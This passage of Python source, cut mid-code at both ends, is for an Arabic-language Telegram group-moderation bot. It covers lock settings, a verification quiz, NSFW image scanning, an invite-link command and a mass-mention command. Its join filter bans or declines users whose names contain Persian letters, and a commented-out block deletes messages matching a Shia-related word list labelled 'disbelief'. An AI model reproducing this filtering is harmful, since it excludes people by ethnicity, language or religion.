  if r.get(f'{m.chat.id}:lockKFR:{Dev_Zaid}') and (m.caption or m.text):
     if m.caption:
         txt = m.caption.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","").replace("ـ","").replace("َ","").replace("ٕ","").replace("ُ","").replace("ِ","").replace("ٰ","").replace("ٖ","").replace("ً","").replace("ّ","").replace("ٌ","").replace("ٍ","").replace("ْ","").replace("ٔ","").replace("'","").replace('"',"")
     if m.text:
         txt = m.text.replace("*","").replace("`","").replace("|","").replace("#","").replace("<","").replace(">","").replace("_","").replace("ـ","").replace("َ","").replace("ٕ","").replace("ُ","").replace("ِ","").replace("ٰ","").replace("ٖ","").replace("ً","").replace("ّ","").replace("ٌ","").replace("ٍ","").replace("ْ","").replace("ٔ","").replace("'","").replace('"',"")
     for kfr in list_Shiaa:
         if kfr in txt:
            m.delete()
            warn = True
            reason = 'الكفر هنا'
            if not r.get(f'{m.chat.id}:disableWarn:{Dev_Zaid}') and not r.get(f'{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}'):
                 r.set(f'{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}',1,ex=60)
                 return m.reply(warner.format(mention,k,reason),disable_web_page_preview=True)
  """

    if r.get(f"{m.chat.id}:lockJoinPersian:{Dev_Zaid}") and m.new_chat_members:
        if m.from_user.first_name:
            if (
                m.from_user.first_name in persianInformation["names"]
                or m.from_user.id in persianInformation["ids"]
                or "ه‍" in m.from_user.first_name
                or "ی" in m.from_user.first_name
                or "ک" in m.from_user.first_name
                or "چ" in m.from_user.first_name
                or "👙" in m.from_user.first_name
            ) and not pre_pls(m.from_user.id, m.chat.id):
                if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                    m.reply(
                        """
「 {} 」
{} تم حظره لاشتباهه ببوت إيراني
☆
""".format(m.from_user.mention, k)
                    )
                return c.ban_chat_member(m.chat.id, m.from_user.id)

        if m.from_user.last_name:
            if (
                m.from_user.last_name in persianInformation["last_names"]
                or m.from_user.id in persianInformation["ids"]
                or "ه‍" in m.from_user.last_name
                or "ی" in m.from_user.last_name
                or "ک" in m.from_user.last_name
                or "چ" in m.from_user.last_name
                or "👙" in m.from_user.last_name
            ) and not pre_pls(m.from_user.id, m.chat.id):
                if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                    m.reply(
                        """
「 {} 」
{} تم حظره لاشتباهه ببوت إيراني
☆
""".format(m.from_user.mention, k)
                    )
                return c.ban_chat_member(m.chat.id, m.from_user.id)

    if r.get(f"{m.chat.id}:enableVerify:{Dev_Zaid}") and m.new_chat_members:
        for me in m.new_chat_members:
            if not pre_pls(me.id, m.chat.id):
                c.restrict_chat_member(
                    m.chat.id, me.id, ChatPermissions(can_send_messages=False)
                )
                get_random = get_for_verify(me)
                question = get_random["question"]
                reply_markup = get_random["key"]
                return m.reply(
                    f"{k} قيدناك عشان نتاكد انك شخص حقيقي مو زومبي\n\n{question}",
                    reply_markup=reply_markup,
                )

    if m.media and r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}"):
        print("nsfw scanner")
        if not admin_pls(id, m.chat.id):
            if m.sticker:
                id = m.sticker.thumbs[0].file_id
            if m.photo:
                id = m.photo.file_id
            if m.video:
                id = m.video.thumbs[0].file_id
            if m.animation:
                id = m.animation.thumbs[0].file_id
        file = c.download_media(id)
        Thread(target=scanR, args=(c, m, id, file)).start()


def scanR(c, m, id, file):
    RUN(scan4(c, m, id, file))


async def scan4(c, m, id, file):
    session = ClientSession()
    arq = ARQ(ARQ_API_URL, ARQ_API_KEY, session)
    resp = await arq.nsfw_scan(file=file)
    if resp.result.is_nsfw:
        print("xNSFW")
        await m.delete()
        k = r.get(f"{Dev_Zaid}:botkey")
        await m.reply(
            f"「 {m.from_user.mention} 」\n{k} تم حذف رسالتك لإحتوائها على محتوى إباحي .\n☆"
        )
    os.remove(file)
    await session.close()


def get_for_verify(me):
    for_verify = [
        {
            "question": "ماهو الحيوان الذي ينتهي اسمه بحرف الباء ؟",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("فأر", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("وشق", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("بشار الأسد", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("حمار", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("كلب", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("قطة", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "ماهي عاصمة فرنسا؟",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("دمشق", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("الرياض", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("باريس", callback_data=f"yes:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("الكويت", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("القاهرة", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("ماشا والدب", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "نادي يبدأ بحرف الباء :",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("برشلونا", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("الهلال", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("النصر", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("الزمالك", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("ريال مدريد", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("مانشستر", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "دولة يبدأ اسمها بحرف التاء :",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("قطر", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("امريكا", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("سوريا", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("مصر", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("الصين", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("تركيا", callback_data=f"yes:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "اختر هذا الايموجي - 🤑 -",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("🍭", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("🤑", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("🏆", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("🌀", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("🪨", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("💎", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "اختر هذا الايموجي - 🔓 -",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("🏆", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("💎", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("🙄", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("💸", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("💣", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("🔓", callback_data=f"yes:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "اختر هذا الايموجي - 🌠 -",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("☄️", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("🙈", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("🦄", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("🌠", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("🌈", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("🧑‍💻", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "ماهي عاصمة سوريا",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("دمشق", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("دير الزور", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("ادلب", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("ليو ميسي", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("الرياض", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("مزة فيلات", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "ماهي عملة الولايات المتحدة الأمريكية",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("الروبية", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("الجنيه", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("الليرة", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("الدولار", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("الدينار", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("الين", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "اسم مذكر يبدأ بحرف ز",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("زيد", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("علي", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("محمد", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("عمر", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("المريخ", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("احمد", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "اسم مؤنث ينتهي بحرف ي",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("لورين", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("ماجدة", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("علياء", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("أماني", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("فرح", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("أمل", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "اسم مؤنث يبدأ بحرف أ",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("لورين", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("ماجدة", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("علياء", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("أمل", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("فرح", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("يمنى", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
        {
            "question": "الأسبوع كم يوم؟",
            "key": InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton("1", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("2", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("3", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("4", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("5", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("6", callback_data=f"no:{me.id}"),
                    ],
                    [
                        InlineKeyboardButton("7", callback_data=f"yes:{me.id}"),
                        InlineKeyboardButton("8", callback_data=f"no:{me.id}"),
                        InlineKeyboardButton("9", callback_data=f"no:{me.id}"),
                    ],
                ]
            ),
        },
    ]
    return random.choice(for_verify)


@Client.on_chat_join_request(filters.group, group=100)
def antiPersian(c, m):
    if r.get(f"{m.chat.id}:lockJoinPersian:{Dev_Zaid}"):
        k = r.get(f"{Dev_Zaid}:botkey")
        if not pre_pls(m.from_user.id, m.chat.id):
            if m.from_user.first_name:
                if (
                    m.from_user.first_name in persianInformation["names"]
                    or m.from_user.id in persianInformation["ids"]
                    or "ه‍" in m.from_user.first_name
                    or "ی" in m.from_user.first_name
                    or "ک" in m.from_user.first_name
                    or "چ" in m.from_user.first_name
                    or "👙" in m.from_user.first_name
                ):
                    c.decline_chat_join_request(m.chat.id, m.from_user.id)
                    if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                        c.send_message(
                            m.chat.id,
                            """
「 {} 」
{} تم رفض طلب انضمامه لاشتباهه ببوت إيراني
☆
""".format(m.from_user.mention, k),
                        )
                    return True
            if m.from_user.last_name:
                if (
                    m.from_user.last_name in persianInformation["last_names"]
                    or m.from_user.id in persianInformation["ids"]
                    or "ه‍" in m.from_user.last_name
                    or "ی" in m.from_user.last_name
                    or "ک" in m.from_user.last_name
                    or "چ" in m.from_user.last_name
                    or "👙" in m.from_user.last_name
                ):
                    c.decline_chat_join_request(m.chat.id, m.from_user.id)
                    if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                        c.send_message(
                            m.chat.id,
                            """
「 {} 」
{} تم رفض طلب انضمامه لاشتباهه ببوت إيراني
☆
""".format(m.from_user.mention, k),
                        )
                    return True


@Client.on_message(filters.group & filters.text, group=28)
def guardCommandsHandler(c, m):
    k = r.get(f"{Dev_Zaid}:botkey")
    channel = (
        r.get(f"{Dev_Zaid}:BotChannel") if r.get(f"{Dev_Zaid}:BotChannel") else "YQYQY6"
    )
    Thread(target=guardCommands, args=(c, m, k, channel)).start()


def guardCommands(c, m, k, channel):
    if not r.get(f"{m.chat.id}:enable:{Dev_Zaid}"):
        return False
    if r.get(f"{m.chat.id}:mute:{Dev_Zaid}") and not admin_pls(
        m.from_user.id, m.chat.id
    ):
        return False
    if r.get(f"{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}"):
        return False
    if r.get(f"{m.from_user.id}:mute:{Dev_Zaid}"):
        return False
    if r.get(f"{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}"):
        return False
    if r.get(f"{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}"):
        return False
    if r.get(f"{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}") or r.get(
        f"{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}"
    ):
        return False
    text = m.text
    name = r.get(f"{Dev_Zaid}:BotName") if r.get(f"{Dev_Zaid}:BotName") else "ليو"
    if text.startswith(f"{name} "):
        text = text.replace(f"{name} ", "")
    if r.get(f"{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}"):
        text = r.get(f"{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}")
    if r.get(f"Custom:{Dev_Zaid}&text={text}"):
        text = r.get(f"Custom:{Dev_Zaid}&text={text}")
    if isLockCommand(m.from_user.id, m.chat.id, text):
        return
    Open = """
{} من 「 {} 」
{} ابشر فتحت {}
☆
"""
    Openn = """
{} من 「 {} 」
{} {} مفتوح من قبل
☆
"""
    Openn2 = """
{} من 「 {} 」
{} {} مفتوحه من قبل
☆
"""

    lock = """
{} من 「 {} 」
{} ابشر قفلت {}
☆
"""

    lockn = """
{} من 「 {} 」
{} {} مقفل من قبل
☆
"""
    locknn = """
{} من 「 {} 」
{} {} مقفله من قبل
☆
"""

    if text == "الاعدادات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            x1 = "مقفول" if r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}") else "مفتوح"
            x2 = "مقفول" if r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}") else "مفتوح"
            x3 = "مقفول" if r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}") else "مفتوح"
            x4 = "مقفول" if r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}") else "مفتوح"
            x5 = "مقفول" if r.get(f"{m.chat.id}:mute:{Dev_Zaid}") else "مفتوح"
            x6 = "مقفول" if r.get(f"{m.chat.id}:lockInline:{Dev_Zaid}") else "مفتوح"
            x7 = "مقفول" if r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}") else "مفتوح"
            x8 = "مقفول" if r.get(f"{m.chat.id}:lockHashtags:{Dev_Zaid}") else "مفتوح"
            x9 = "مقفول" if r.get(f"{m.chat.id}:lockEdit:{Dev_Zaid}") else "مفتوح"
            x10 = "مقفول" if r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}") else "مفتوح"
            x11 = "مقفول" if r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}") else "مفتوح"
            x12 = (
                "مقفول" if r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}") else "مفتوح"
            )
            x13 = "مقفول" if r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}") else "مفتوح"
            x14 = "مقفول" if r.get(f"{m.chat.id}:lockBots:{Dev_Zaid}") else "مفتوح"
            x15 = "مقفول" if r.get(f"{m.chat.id}:lockTags:{Dev_Zaid}") else "مفتوح"
            x16 = "مقفول" if r.get(f"{m.chat.id}:lockNot:{Dev_Zaid}") else "مفتوح"
            x17 = (
                "مقفول" if r.get(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}") else "مفتوح"
            )
            x18 = "مقفول" if r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}") else "مفتوح"
            x19 = "مقفول" if r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}") else "مفتوح"
            x20 = "مقفول" if r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}") else "مفتوح"
            x21 = "مقفول" if r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}") else "مفتوح"
            x22 = "مقفول" if r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}") else "مفتوح"
            x23 = "مقفول" if r.get(f"{m.chat.id}:lockJoin:{Dev_Zaid}") else "مفتوح"
            x24 = "مقفول" if r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}") else "مفتوح"
            x25 = (
                "مقفول" if r.get(f"{m.chat.id}:lockJoinPersian:{Dev_Zaid}") else "مفتوح"
            )
            x26 = "مقفول" if r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}") else "مفتوح"
            return m.reply(f"""
اعدادات المجموعة :

{k} الملفات الصوتية ⇠ ( {x1} )
{k} الفيديو ⇠ ( {x2} )
{k} الفويس ⇠ ( {x3} )
{k} الصور ⇠ ( {x4} )

{k} الدردشة ⇠ ( {x5} )
{k} الانلاين ⇠ ( {x6} )
{k} التوجيه ⇠ ( {x7} )
{k} الهشتاق ⇠ ( {x8} )
{k} التعديل ⇠ ( {x9} )
{k} الستيكرات ⇠ ( {x10} )

{k} الملفات ⇠ ( {x11} )
{k} المتحركات ⇠ ( {x12} )
{k} الروابط ⇠ ( {x13} )
{k} البوتات ⇠ ( {x14} )
{k} اليوزرات ⇠ ( {x15} )

{k} الاشعارات ⇠ ( {x16} )
{k} الاضافة ⇠ ( {x17} )

{k} الكلام الكثير ⇠ ( {x18} )
{k} السب ⇠ ( {x19} )
{k} التكرار ⇠ ( {x20} )
{k} القنوات ⇠ ( {x21} )
{k} تعديل الميديا ⇠ ( {x22} )

{k} الدخول ⇠ ( {x23} )
{k} الفارسية ⇠ ( {x24} )
{k} دخول الإيراني ⇠ ( {x25} )
{k} الإباحي ⇠ ( {x26} )

~ @{channel}""")

    if text == "الساعه" or text == "الساعة" or text == "الوقت":
        TIME_ZONE = "Asia/Riyadh"
        ZONE = pytz.timezone(TIME_ZONE)
        TIME = datetime.now(ZONE)
        clock = TIME.strftime("%I:%M %p")
        return m.reply(f"{k} الساعة ( {clock} )")

    if text == "القوانين":
        if r.get(f"{m.chat.id}:CustomRules:{Dev_Zaid}"):
            rules = r.get(f"{m.chat.id}:CustomRules:{Dev_Zaid}")
        else:
            rules = f"""{k} ممنوع نشر الروابط
{k} ممنوع التكلم او نشر صور اباحيه
{k} ممنوع اعاده توجيه
{k} ممنوع العنصرية بكل انواعها
{k} الرجاء احترام المدراء والادمنيه"""
        return m.reply(rules, disable_web_page_preview=True)

    if text == "التاريخ":
        b = Hijri.today().isoformat()
        a = b.split("-")
        year = int(a[0])
        month = int(a[1])
        day = int(a[2])
        hijri = Hijri(year, month, day)
        hijri_date = str(b).replace("-", "/")
        hijri_month = hijri.month_name("ar")

        b = Gregorian.today().isoformat()
        a = b.split("-")
        year = int(a[0])
        month = int(a[1])
        day = int(a[2])
        geo = Gregorian(year, month, day)
        geo_date = str(b).replace("-", "/")
        geo_month = geo.month_name("en")[:3]

        return m.reply(f"""
التاريخ:
{k} هجري ↢ {hijri_date} {hijri_month}
{k} ميلادي ↢ {geo_date} {geo_month}
""")

    if text == "المالك":
        owner = None
        for mm in m.chat.get_members(filter=ChatMembersFilter.ADMINISTRATORS):
            if mm.status == ChatMemberStatus.OWNER:
                owner = mm.user
                break
        if owner:
            if owner.is_deleted:
                m.reply("حساب المالك محذوف")
            else:
                owner_username = owner.username if owner.username else owner.id
                caption = f"• Owner ☆ ↦ {owner.mention}\n\n"
                caption += f"• Owner User ↦ @{owner_username}"
                if owner.photo:
                    file_id = owner.photo.big_file_id
                    photo_path = c.download_media(file_id)
                    button = InlineKeyboardMarkup(
                        [[InlineKeyboardButton(owner.first_name, user_id=owner.id)]]
                    )
                    m.reply_photo(
                        photo=photo_path, caption=caption, reply_markup=button
                    )
                    os.remove(photo_path)
                else:
                    button = InlineKeyboardMarkup(
                        [[InlineKeyboardButton(owner.first_name, user_id=owner.id)]]
                    )
                    m.reply(caption, reply_markup=button)

    if text == "اطردني":
        if r.get(f"{m.chat.id}:enableKickMe:{Dev_Zaid}"):
            get = m.chat.get_member(m.from_user.id)
            if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
                return m.reply(f"{k} ممنوع طرد الحلوين")
            if admin_pls(m.from_user.id, m.chat.id):
                return m.reply(f"{k} ممنوع طرد الحلوين")
            else:
                m.reply(
                    f"طردتك يانفسية , وارسلت لك الرابط خاص تقدر ترجع متى مابغيت يامعقد"
                )
                m.chat.ban_member(m.from_user.id)
                time.sleep(0.5)
                c.unban_chat_member(m.chat.id, m.from_user.id)
                link = c.get_chat(m.chat.id).invite_link
                try:
                    c.send_message(
                        m.from_user.id,
                        f"{k} حبيبي النفسية رابط القروب الي طردتك منه: {link}",
                    )
                except:
                    pass
                return False

    if text == "الرابط":
        if not r.get(f"{m.chat.id}:disableLINK:{Dev_Zaid}"):
            link = c.get_chat(m.chat.id).invite_link
            return m.reply(f"[{m.chat.title}]({link})", disable_web_page_preview=True)

    if text == "انشاء رابط":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        link = c.get_chat(m.chat.id).invite_link
        c.revoke_chat_invite_link(m.chat.id, link)
        return m.reply(f'{k} ابشر سويت رابط جديد ارسل "الرابط"')

    if text.startswith("@all"):
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        if r.get(f"{m.chat.id}:disableALL:{Dev_Zaid}"):
            return m.reply("المنشن معطل")
        if r.get(f"{m.chat.id}:inMention:{Dev_Zaid}"):
            return False
        if r.get(f"{m.chat.id}:inMentionWAIT:{Dev_Zaid}"):
            get = r.ttl(f"{m.chat.id}:inMentionWAIT:{Dev_Zaid}")
            tm = time.strftime("%M:%S", time.gmtime(get))
            return m.reply(f"{k} سويت منشن من شوي تعال بعد {tm}")
        else:
            if len(text.split()) > 1:
                reason = text.split(None, 1)[1]
            else:
                reason = ""
            users_list = []
            r.set(f"{m.chat.id}:inMention:{Dev_Zaid}", 1)
            m.reply(f"{k} بسوي منشن يحلو ، اذا تبي توقفه ارسل `/Cancel` او `ايقاف`")
            for mm in m.chat.get_members(limit=150):
                if mm.user and not mm.user.is_deleted and not mm.user.is_bot:
                    users_list.append(mm.user.mention)
            final_list = [users_list[x : x + 5] for x in range(0, len(users_list), 5)]
            ftext = f"{reason}\n\n"
            for a in final_list:
                for i in a:
                    if not r.get(f"{m.chat.id}:inMention:{Dev_Zaid}"):
                        return False
                    ftext += f"{i} , "
                c.send_message(m.chat.id, ftext)
                ftext = f"{reason}\n\n"
            r.delete(f"{m.chat.id}:inMention:{Dev_Zaid}")
            r.set(f"{m.chat.id}:inMentionWAIT:{Dev_Zaid}", 1, ex=1200)

    if text.lower() == "/cancel" or text == "ايقاف":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:inMention:{Dev_Zaid}"):
                return m.reply(f"{k} مو قاعده اسوي منشن ركز")
            else:
                r.delete(f"{m.chat.id}:inMention:{Dev_Zaid}")
                return m.reply("ابشر وقفت المنشن")

    if text == "منشن":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        return m.reply("استخدم امر\n@all مع الكلام")

    if text == "تعطيل المنشن":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableALL:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} المشن معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableALL:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت المنشن\n☆"
                )

    if text == "تفعيل المنشن":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableALL:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} المنشن مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableALL:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت المنشن\n☆"
                )

    if text == "تعطيل الترحيب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableWelcome:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الترحيب معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableWelcome:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الترحيب\n☆"
                )

    if text == "تعطيل الترحيب بالصورة" or text == "تعطيل الترحيب بالصوره":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableWelcomep:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الترحيب بالصورة من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableWelcomep:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الترحيب بالصورة\n☆"
                )

    if text == "تفعيل الترحيب بالصورة" or text == "تفعيل الترحيب بالصوره":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableWelcomep:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الترحيب بالصورة مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableWelcomep:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الترحيب بالصورة\n☆"
                )

    if text == "تعطيل الرابط":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableLINK:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الرابط معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableLINK:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الرابط\n☆"
                )

    if text == "تفعيل الرابط":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableLINK:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الرابط مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableLINK:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الرابط\n☆"
                )

    if text == "تعطيل البايو":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableBio:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} البايو معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableBio:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت البايو\n☆"
                )

    if text == "تفعيل البايو":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableBio:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} البايو مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableBio:{Dev_Zaid}")
